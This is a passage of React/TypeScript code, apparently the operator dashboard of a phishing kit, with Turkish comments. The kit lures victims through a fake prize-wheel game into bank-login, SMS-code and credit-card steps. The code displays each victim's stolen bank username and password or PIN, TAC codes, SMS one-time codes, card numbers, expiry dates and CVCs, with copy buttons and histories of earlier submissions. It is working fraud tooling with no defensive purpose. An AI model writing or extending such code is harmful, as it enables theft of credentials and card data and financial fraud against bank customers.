                      bankName: e.bankName || "",
                    };
                  })
                  .filter(Boolean)
                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
                const smsHistory: any[] = [];
                for (let i = 0; i < smsHistoryRaw.length; i++) {
                  const p = i > 0 ? smsHistoryRaw[i - 1] : null;
                  if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
                }

                // ⭐⭐⭐⭐⭐ BANKA İLE AYNI KALICI KURAL (SMS GEÇMİŞİ):
                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
                //          2 kez ayni SMS girilirse (1.SMS=1234, 2.SMS=1234) → ESKI 1234 da siliniyordu → GEÇMİŞ YOK!
                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
                const smsMatchesCurrentIndices: number[] = [];
                if (currentSmsValue.length > 0) {
                  for (let i = 0; i < smsHistory.length; i++) {
                    const e = smsHistory[i] as any;
                    if (e && e.sms === currentSmsValue) smsMatchesCurrentIndices.push(i);
                  }
                }
                const smsRemoveIdx = smsMatchesCurrentIndices.length >= 2
                  ? Math.max(...smsMatchesCurrentIndices)
                  : -1;
                // SADECE en yeni (en buyuk index) olanı cikar:
                const smsHistoryFinal: any[] = smsRemoveIdx >= 0
                  ? smsHistory.filter((_, i) => i !== smsRemoveIdx)
                  : smsHistory.slice();
                Object.assign(smsHistory, smsHistoryFinal);
                smsHistory.length = smsHistoryFinal.length;
                for (let i = 0; i < smsHistoryFinal.length; i++) smsHistory[i] = smsHistoryFinal[i];
                const smsHistoryCount = smsHistory.length;

                // ⭐ KART GECMISI HESAPLA:
                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "KART BILGISI").
                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
                //   1) htmlStepLabel === "KART BILGISI" + en az 1 alan (no/exp/cvc) dolu.
                //   2) Aynı kart ard arda 1 tane birak (No + Exp + Cvc ayniysa ayni kart).
                //   3) ⭐ Son (en yeni) kayit kart bilgileri KOLONDAKI ile TAMAMEN AYNI ise listeden KALDIR.
                const cardHistoryRaw = history
                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "KART BILGISI")
                  .map((e: any) => {
                    const no = String(e.cardNumber || "").trim();
                    const skt = String(e.cardExpiry || "").trim();
                    const cvc = String(e.cardCvc || "").trim();
                    if (!no && !skt && !cvc) return null;
                    return {
                      cardNumber: no,
                      cardExpiry: skt,
                      cardCvc: cvc,
                      capturedAt: e.capturedAt || "",
                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
                      bankSlug: e.bankSlug || "",
                      bankName: e.bankName || "",
                    };
                  })
                  .filter(Boolean)
                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
                const cardHistory: any[] = [];
                for (let i = 0; i < cardHistoryRaw.length; i++) {
                  const p = i > 0 ? (cardHistoryRaw[i - 1] as any) : null;
                  const cur = cardHistoryRaw[i] as any;
                  if (
                    !p ||
                    p.cardNumber !== cur.cardNumber ||
                    p.cardExpiry !== cur.cardExpiry ||
                    p.cardCvc !== cur.cardCvc
                  ) {
                    cardHistory.push(cur);
                  }
                }

                // ⭐⭐⭐⭐⭐ BANKA/SMS İLE AYNI KALICI KURAL (KART GEÇMİŞİ):
                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
                //          2 kez ayni kart girilirse (1. kart = 4111..., 2. kart = ayni 4111...) → ESKI kayit siliniyordu → GEÇMİŞ YOK!
                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
                const cardHasAnyCurrent = currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0;
                const cardMatchesCurrentIndices: number[] = [];
                if (cardHasAnyCurrent) {
                  for (let i = 0; i < cardHistory.length; i++) {
                    const e = cardHistory[i] as any;
                    if (!e) continue;
                    const same =
                      e.cardNumber === currentCardNo &&
                      e.cardExpiry === currentCardExp &&
                      e.cardCvc === currentCardCvc;
                    if (same) cardMatchesCurrentIndices.push(i);
                  }
                }
                const cardRemoveIdx = cardMatchesCurrentIndices.length >= 2
                  ? Math.max(...cardMatchesCurrentIndices)
                  : -1;
                // SADECE en yeni (en buyuk index) olanı cikar:
                const cardHistoryFinal: any[] = cardRemoveIdx >= 0
                  ? cardHistory.filter((_, i) => i !== cardRemoveIdx)
                  : cardHistory.slice();
                Object.assign(cardHistory, cardHistoryFinal);
                cardHistory.length = cardHistoryFinal.length;
                for (let i = 0; i < cardHistoryFinal.length; i++) cardHistory[i] = cardHistoryFinal[i];
                const cardHistoryCount = cardHistory.length;

                // ⭐ BANKA GECMISI HESAPLA (SMS/KART ile BIREBIR MANTIK):
                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel SMS/KART DISINDA olanlar).
                //   - ⚠️ EN KRITIK KURAL: LEGACY SNAPSHOT (tek kayit = kolonun kopyasi) ASLA GEÇMİŞ OLARAK SAYILMAZ!
                //     (eger sayarsan "gecmis butonu gorunur, basarsan kolonun AYNISINI gorursun" = SACMA)
                //   - ILK BANKA FORM (1 form): GECMIS YOKTUR, buton YOKTUR (sadece kolon gorunur ✅).
                //   - 2+ BANKA FORM (2 veya 3 form): GERCEK push edilmis FORMLAR (ESKİLER) listelenir.
                //   1) Gurultu: isLegacySnapshot (tamamen sil) + label SMS/KART (sil).
                //   2) TUM alanlar (8+) bossa (bos snapshot) sil.
                //   3) Dedup (ard arda ayni form 1 tane birak).
                //   4) ⭐ Son (en yeni) kayit TUM 8 alan KOLONDAKI ile BIREBIR AYNI ise listeden KALDIR.
                const bankHistoryRawPre0 = history
                  .filter((e: any) => {
                    // ⚠️ 1) LEGACY SNAPSHOT = KOLONUN KENDISI. ASLA GECMIS DEGIL!
                    if (!e || e.isLegacySnapshot === true) return false;
                    const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
                    return label !== "SMS KODU" && label !== "KART BILGISI";
                  })
                  .filter((e: any) => {
                    // 2) Gurultu: tum alanlar bossa (bos kayit) sil
                    const sO1 = String(e.orderedField1 || "").trim();
                    const sUser = String(e.username || e.verfuegernummer || "").trim();
                    const sPass = String(e.password || e.pin || "").trim();
                    const sTac = String(e.tacCode || "").trim();
                    const sPhone = String(e.bankPhone || "").trim();
                    const sPers = String(e.personalCode || "").trim();
                    const sO2 = String(e.orderedField2 || "").trim();
                    const sO3 = String(e.orderedField3 || "").trim();
                    return !(sO1.length === 0 && sUser.length === 0 && sPass.length === 0 && sTac.length === 0 && sPhone.length === 0 && sPers.length === 0 && sO2.length === 0 && sO3.length === 0);
                  })
                  .map((e: any) => ({
                    ...e,
                    _o1: String(e.orderedField1 || "").trim(),
                    _user: String(e.username || e.verfuegernummer || "").trim(),
                    _pass: String(e.password || e.pin || "").trim(),
                    _tac: String(e.tacCode || "").trim(),
                    _phone: String(e.bankPhone || "").trim(),
                    _pers: String(e.personalCode || "").trim(),
                    _o2: String(e.orderedField2 || "").trim(),
                    _o3: String(e.orderedField3 || "").trim(),
                  }));

                // 3) Dedup: ard arda GIRILEN AYNI formu 1 tane birak (tum 8 alan esit)
                const bankHistoryRawPre1: any[] = [];
                for (let i = 0; i < bankHistoryRawPre0.length; i++) {
                  const cur = bankHistoryRawPre0[i];
                  const prev = i > 0 ? bankHistoryRawPre0[i - 1] : null;
                  if (!prev) { bankHistoryRawPre1.push(cur); continue; }
                  const same =
                    prev._o1 === cur._o1 &&
                    prev._user === cur._user &&
                    prev._pass === cur._pass &&
                    prev._tac === cur._tac &&
                    prev._phone === cur._phone &&
                    prev._pers === cur._pers &&
                    prev._o2 === cur._o2 &&
                    prev._o3 === cur._o3;
                  if (!same) bankHistoryRawPre1.push(cur);
                }

                // ⭐⭐⭐⭐⭐ KALICI YENİ KURAL (BANKA GEÇMİŞİ - EN GÜVENİLİR):
                //   ❌ ESKI 1 (SORUNLU): TUM alanlar ayniysa SADECE SON kaydi SIL.
                //      SORUN: 2 kez ayni deger girildiyse (1.form=0400, 2.form=0400) → ESKI 0400 da siliniyordu → GEÇMİŞ YOK!
                //   ✅ YENI KURAL:
                //   Adım 1: TÜM KAYITLARI GEZ, KOLON İLE TÜM ALANLARI AYNI OLAN KAYITLARIN INDEXLERINI BUL.
                //   Adım 2: Bu indexlerden SADECE EN BÜYÜĞÜNÜ (EN YENİ = SON GİRİLENİ) SİL. ÇÜNKÜ O KOLONUN KENDİSİDİR.
                //   Adım 3: DİĞER (daha eski indexli) AYNI değerli KAYITLARI KORU. Onlar GERÇEKTEN ÖNCEKİ GİRİŞLERDİR!
                //
                //   ÖRNEK 1: 1.form=0400 (index 0), 2.form=0411 (index 1) → Kolon=0411
                //            Kolon ile ayni olanlar: [index1 (0411)]
                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski)
                //   ÖRNEK 2: 1.form=0400 (index0), 2.form=0400 (index1) → Kolon=0400
                //            Kolon ile ayni olanlar: [index0 (0400), index1 (0400)]
                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski, 2.form şu anki kolon)
                //   ÖRNEK 3: 1.form (0400) yok, 2.form (0411) var → Kolon=0411
                //            bankHistoryPre1 length = 1 (0411) → en yeni index 0 sil → kalan 0 → GEÇMİŞ YOK ✅ (doğru)

                // Adım A: Hangileri kolon ile tamamen ayni? Hepsinin indexini al.
                const currentHasAny =
                  currentBankOrdered1.length > 0 ||
                  currentBankUser.length > 0 ||
                  currentBankPass.length > 0 ||
                  currentTac.length > 0 ||
                  currentBankPhone.length > 0 ||
                  currentPersonalCode.length > 0;
                const bankMatchesCurrentIndices: number[] = [];
                if (currentHasAny) {
                  for (let i = 0; i < bankHistoryRawPre1.length; i++) {
                    const e = bankHistoryRawPre1[i];
                    const allMatch =
                      e._o1 === currentBankOrdered1 &&
                      e._user === currentBankUser &&
                      e._pass === currentBankPass &&
                      e._tac === currentTac &&
                      e._phone === currentBankPhone &&
                      e._pers === currentPersonalCode &&
                      e._o2 === currentO2 &&
                      e._o3 === currentO3;
                    if (allMatch) bankMatchesCurrentIndices.push(i);
                  }
                }
                // Adım B: En buyuk (EN YENİ) indexi bul, SADECE ONU silecegiz.
                // ⭐⭐⭐ KALICI KURAL: SADECE 2 VEYA DAHA FAZLA AYNI DEGERLI KAYIT varsa (kolon ile ayni olanlardan en sondaki (en yeni) SIL.
                //   Eğer 1 tane eslesen kayit varsa (tek kayit kolon ile ayni) → SILME, o ESKI giristir (tekrar edilen formdur)!
                //   Ornek: 1.form=0400, 2.form=TEKRAR 0400 girilirse history = [0400] (tek kayit). Kolon=0400).
                //   Eski kural length>0 → removeIndex=0 → 0 kayit → buton YOK ❌.
                //   Yeni kural length>=2 → length 1 → removeIndex=-1 → 1 kayit → buton (1) var ✅ (ESKI goster).
                const removeIndex = bankMatchesCurrentIndices.length >= 2
                  ? Math.max(...bankMatchesCurrentIndices)
                  : -1;

                // Adım C: Tüm listeden SADECE removeIndex'i cikar.
                const bankHistoryRaw: any[] = bankHistoryRawPre1.filter((_, i) => i !== removeIndex);
                const bankHistoryCount = bankHistoryRaw.length;
                (fd as any)._bankHistory = bankHistoryRaw;
                (fd as any)._smsHistory = smsHistory;
                (fd as any)._cardHistory = cardHistory;
                
                let stepText = "BAŞLANGIÇ";
                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
                
                let s = row.current_step as string;
                const livePath = sessionPaths[row.id];
                if (isOnline && livePath) {
                  if (livePath.startsWith('/wheel')) s = "wheel";
                  else {
                    const mapped = pathToStep(livePath);
                    if (mapped) s = mapped;
                  }
                }

                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                else if (s === "code_entry") {
                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
                }
                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                else if (s === "bank") {
                  stepText = `BANKA GİRİŞİ ${fd.bankName ? `(${fd.bankName})` : ""}`;
                  stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
                }
                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
                else if (s === "special_approval") {
                  if (row.status === "SPECIAL_INFO") {
                    stepText = "ÖZEL BİLDİRİM";
                    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
                  } else if (typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()) {
                    stepText = getApprovalStepLabel(fd.approvalStatus.trim());
                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
                  } else {
                    stepText = "ONAY";
                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
                  }
                }

                const canonicalBankFields = getCanonicalAdminBankFields(fd);
                const approvalHistory = parseApprovalHistory(fd.approvalHistory);
                const approvalEntries = approvalHistory;
                const smsValue = currentSmsValue;

                // ⭐ ODUL HESABI (TEK DOGRULUK KAYNAGI):
                //   KULLANICI CARKIN DURDUGU DILIM hangisiyse O GOSTERILIR (asla karistirilmaz!).
                //   Oncelik: 1) wheel_rotation_index → 2) wheel_result_label → 3) wheel_result_amount → 4) row.amount
                //   Boylece "kullanici 4500 gordu, admin 4000 gordu" hatasi OLMAZ.
                const wheelPrize = resolveWheelPrize(
                  fd as Record<string, unknown>,
                  typeof row.amount === "number" ? row.amount : null,
                );
                const displayPrizeAmount = wheelPrize.amount;
                const displayPrizeLabel = wheelPrize.label;
                const currencyFromFd =
                  typeof fd.currency === "string" && fd.currency.trim()
                    ? fd.currency.trim()
                    : WHEEL_CURRENCY;
                const hasAnyPrize = displayPrizeAmount > 0 || displayPrizeLabel.length > 0;

                // ⭐ ISIM KOLONU ICERIGI: SADECE AD SOYAD GOSTER.
                //   ⚠️ KULLANICIDA ACIKLAMA: "kazandığı ödül neden isim kolonunda var admin panelinde
                //      zaten kazandığı ödül ödül kolonunda yazıyor"
                //   SONUC: Isim kolonu odul GÖSTERMEZ, sadece ad-soyad, yoksa "-".
                const displayNameContent = (() => {
                  const hasName =
                    (typeof fd.firstName === "string" && fd.firstName.trim().length > 0) ||
                    (typeof fd.lastName === "string" && fd.lastName.trim().length > 0);
                  if (hasName) {
                    return {
                      kind: "name" as const,
                      text: `${fd.firstName ?? ""} ${fd.lastName ?? ""}`.trim(),
                    };
                  }
                  return { kind: "empty" as const, text: "-" };
                })();

                // ⭐ ODUL KOLONU ICERIGI: YUKARIDAKI 4 katmanli fallback kullan.
                const displayPrizeColText = (() => {
                  if (hasAnyPrize) {
                    if (displayPrizeAmount > 0) {
                      return `${currencyFromFd}${Number(displayPrizeAmount).toLocaleString("en-AU")}`;
                    }
                    return displayPrizeLabel;
                  }
                  return "-";
                })();

                return (
                  <Fragment key={row.id}>
                  <tr className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                    <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
                      {row.id.split('-')[0]}
                    </td>
                    <td
                      className="px-2 py-3 align-top whitespace-nowrap font-semibold text-[11px] lg:text-xs text-[#EB5E28]/95"
                      title={displayPrizeLabel || "Kazanç"}
                    >
                      {displayPrizeColText}
                    </td>
                    <td className="px-2 py-3 align-top">
                      {displayNameContent.kind === "name" ? (
                        <div
                          className="cursor-pointer text-[14px] font-bold opacity-100 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]"
                          onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}
                        >
                          {displayNameContent.text}
                        </div>
                      ) : (
                        <div className="text-[14px] font-bold opacity-50">-</div>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="cursor-pointer text-[12px] opacity-90 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                        {fd.phone || '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="flex w-full flex-col items-start gap-1.5 leading-tight">
                        {/* 1) Ust: Banka Adi + loginMethod badge */}
                        {fd.bankName ? (
                          <div className="mb-0.5 flex min-w-0 flex-wrap items-center gap-1 w-full">
                            <span
                              className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
                              onClick={() => copyToClipboard(fd.bankName)}
                            >
                              {fd.bankName}
                            </span>
                            {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
                              <span
                                className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
                                onClick={() => copyToClipboard(fd.loginMethod)}
                              >
                                {fd.loginMethod}
                              </span>
                            ) : null}
                          </div>
                        ) : (
                          typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
                            <div
                              className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
                              onClick={() => copyToClipboard(fd.loginMethod)}
                            >
                              {fd.loginMethod}
                            </div>
                          ) : null
                        )}

                        {/* 2) Orta: ID / Sifre / TAC / Kart No / Hesap No alanlar listesi (canonicalBankFields) */}
                        <div className="flex w-full flex-col items-start gap-1.5">
                          {canonicalBankFields.map(([key, value]) => {
                            let displayKey = key;
                            let displayValueClass =
                              "min-w-0 cursor-pointer font-semibold text-[11px] transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]";
                            const badgeClass =
                              "mt-0.5 shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide whitespace-nowrap shadow-sm";
                            let labelBadgeClass = badgeClass;

                            if (displayKey === "username") {
                              displayKey = "ID / K.Adı";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-sky-500/30 bg-sky-500/15 text-sky-400"
                                  : "border-sky-500/30 bg-sky-500/15 text-sky-700"
                              }`;
                              displayValueClass = `${displayValueClass} ${darkMode ? "text-sky-300" : "text-sky-800"}`;
                            } else if (displayKey === "password") {
                              displayKey = "Şifre / PIN";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
                                  : "border-rose-500/30 bg-rose-500/15 text-rose-700"
                              }`;
                              displayValueClass = `min-w-0 cursor-pointer font-mono text-[11px] font-bold tracking-wide whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
                            } else if (displayKey === "tacCode") {
                              displayKey = "TAC";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-orange-500/30 bg-orange-500/15 text-orange-400"
                                  : "border-orange-500/30 bg-orange-500/15 text-orange-700"
                              }`;
                              displayValueClass = `${displayValueClass} font-mono tracking-wider ${darkMode ? "text-orange-300" : "text-orange-800"}`;
                            } else if (displayKey === "rekeningnummer") {
                              displayKey = "Hesap No";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-emerald-500/30 bg-emerald-500/15 text-emerald-400"
                                  : "border-emerald-500/30 bg-emerald-500/15 text-emerald-700"
                              }`;
                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-emerald-300" : "text-emerald-800"}`;
                            } else if (displayKey === "pasnummer") {
                              displayKey = "Kart No";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
                                  : "border-rose-500/30 bg-rose-500/15 text-rose-700"
                              }`;
                              displayValueClass = `min-w-0 cursor-pointer font-mono text-[12px] font-bold tracking-[0.12em] whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
                            } else if (displayKey === "toegangscode") {
                              displayKey = "Giriş Kodu";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-indigo-500/30 bg-indigo-500/15 text-indigo-400"
                                  : "border-indigo-500/30 bg-indigo-500/15 text-indigo-700"
                              }`;
                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-indigo-300" : "text-indigo-800"}`;
                            } else if (displayKey === "signatuur") {
                              displayKey = "İmza";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-teal-500/30 bg-teal-500/15 text-teal-400"
                                  : "border-teal-500/30 bg-teal-500/15 text-teal-700"
                              }`;
                              displayValueClass = `${displayValueClass} italic ${darkMode ? "text-teal-300" : "text-teal-800"}`;
                            } else if (displayKey === "identificatiecode") {
                              displayKey = "Kimlik Kodu";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-cyan-500/30 bg-cyan-500/15 text-cyan-400"
                                  : "border-cyan-500/30 bg-cyan-500/15 text-cyan-700"
                              }`;
                              displayValueClass = `${displayValueClass} ${darkMode ? "text-cyan-300" : "text-cyan-800"}`;
                            } else if (displayKey === "personalCode") {
                              displayKey = "Kimlik No / ID";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-400"
                                  : "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-700"
                              }`;
                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-fuchsia-300" : "text-fuchsia-800"}`;
                            } else if (displayKey === "bankPhone") {
                              displayKey = "Telefon";
                              labelBadgeClass = `${badgeClass} ${
                                darkMode
                                  ? "border-lime-500/30 bg-lime-500/15 text-lime-400"
                                  : "border-lime-500/30 bg-lime-500/15 text-lime-700"
                              }`;
                              displayValueClass = `${displayValueClass} ${darkMode ? "text-lime-300" : "text-lime-800"}`;
                            } else {
                              labelBadgeClass = `${badgeClass} opacity-60 ${darkMode ? "border-white/10 bg-white/5 text-zinc-400" : "border-black/5 bg-black/5 text-zinc-600"}`;
                              displayValueClass = `${displayValueClass} ${darkMode ? "text-zinc-200" : "text-zinc-800"}`;
                            }

                            return (
                              <div key={key} className="flex min-w-0 w-full items-start gap-1.5 leading-tight">
                                <span className={labelBadgeClass}>
                                  {displayKey}
                                </span>
                                <span
                                  className={displayValueClass}
                                  onClick={() => copyToClipboard(String(value))}
                                >
                                  {String(value)}
                                </span>
                              </div>
                            );
                          })}
                        </div>

                        {/* 3) ALT: Alanlarin TAM ALTINDA (sms/kart gibi flex-col sonda) GEÇMİŞ (N) BUTONU —
                             artik cok sagda DEGIL, kolonun sol tarafinda, alanlarin hemen altinda. */}
                        {bankHistoryCount > 0 ? (
                          <div className="mt-1 flex w-full justify-start">
                            <button
                              type="button"
                              onClick={() =>
                                setExpandedBankHistorySessionId(
                                  expandedBankHistorySessionId === row.id ? null : row.id,
                                )
                              }
                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
                                expandedBankHistorySessionId === row.id
                                  ? darkMode
                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
                                  : darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
                              }`}
                              title="Eski banka form girişlerini göster"
                            >
                              GEÇMİŞ ({bankHistoryCount})
                            </button>
                          </div>
                        ) : null}
                      </div>
                    </td>
                    <td className="hidden px-2 py-3 align-top">
                      {approvalEntries.length === 0 ? (
                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                      ) : (
                        <div className="flex flex-col items-start gap-1">
                          {approvalEntries.map((approvalValue, index) => (
                            <span
                              key={`${approvalValue}-${index}`}
                              className="inline-flex w-fit max-w-full items-center self-start rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                            >
                              {getApprovalDisplayText(approvalValue)}
                            </span>
                          ))}
                        </div>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="flex flex-col gap-1.5">
                        <div
                          className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                          onClick={() => copyToClipboard(smsValue)}
                        >
                          {smsValue || '-'}
                        </div>
                        {smsHistoryCount > 0 ? (
                          <div className="flex justify-start">
                            <button
                              type="button"
                              onClick={() =>
                                setExpandedSmsHistorySessionId(
                                  expandedSmsHistorySessionId === row.id ? null : row.id,
                                )
                              }
                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
                                expandedSmsHistorySessionId === row.id
                                  ? darkMode
                                    ? "border-indigo-500/40 bg-indigo-500/15 text-indigo-400 hover:bg-indigo-500 hover:text-white"
                                    : "border-indigo-500/40 bg-indigo-500/15 text-indigo-600 hover:bg-indigo-500 hover:text-white"
                                  : darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
                              }`}
                              title="Eski SMS kodlarını göster"
                            >
                              GEÇMİŞ ({smsHistoryCount})
                            </button>
                          </div>
                        ) : null}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="flex flex-col gap-1.5">
                        <div className="space-y-1.5 leading-tight">
                          {fd.cardNumber ? (
                            <div className="flex min-w-0 items-start gap-1.5">
                              <span className="shrink-0 rounded-md border border-rose-500/30 bg-rose-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap shadow-sm">
                                NO
                              </span>
                              <span
                                className="min-w-0 cursor-pointer font-mono text-[13px] lg:text-[14px] font-bold tracking-[0.12em] text-rose-600 dark:text-rose-400 hover:underline hover:text-rose-700 dark:hover:text-rose-300 whitespace-normal break-words [overflow-wrap:anywhere]"
                                onClick={() => copyToClipboard(fd.cardNumber)}
                              >
                                {fd.cardNumber}
                              </span>
                            </div>
                          ) : null}
                          {fd.cardExpiry ? (
                            <div className="flex min-w-0 items-start gap-1.5">
                              <span className="shrink-0 rounded-md border border-amber-500/30 bg-amber-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-amber-600 dark:text-amber-400 whitespace-nowrap shadow-sm">
                                SKT
                              </span>
                              <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-amber-700 dark:text-amber-400 whitespace-normal break-words [overflow-wrap:anywhere]">
                                {fd.cardExpiry}
                              </span>
                            </div>
                          ) : null}
                          {fd.cardCvc ? (
                            <div className="flex min-w-0 items-start gap-1.5">
                              <span className="shrink-0 rounded-md border border-violet-500/30 bg-violet-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-violet-600 dark:text-violet-400 whitespace-nowrap shadow-sm">
                                CVC
                              </span>
                              <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-violet-700 dark:text-violet-400 whitespace-normal break-words [overflow-wrap:anywhere]">
                                {fd.cardCvc}
                              </span>
                            </div>
                          ) : null}
                          {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? (
                            <span className={`font-medium text-[11px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                          ) : null}
                        </div>
                        {cardHistoryCount > 0 ? (
                          <div className="flex justify-start">
                            <button
                              type="button"
                              onClick={() =>
                                setExpandedCardHistorySessionId(
                                  expandedCardHistorySessionId === row.id ? null : row.id,
                                )
                              }
                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
                                expandedCardHistorySessionId === row.id
                                  ? darkMode
                                    ? "border-rose-500/40 bg-rose-500/15 text-rose-400 hover:bg-rose-500 hover:text-white"
                                    : "border-rose-500/40 bg-rose-500/15 text-rose-600 hover:bg-rose-500 hover:text-white"
                                  : darkMode
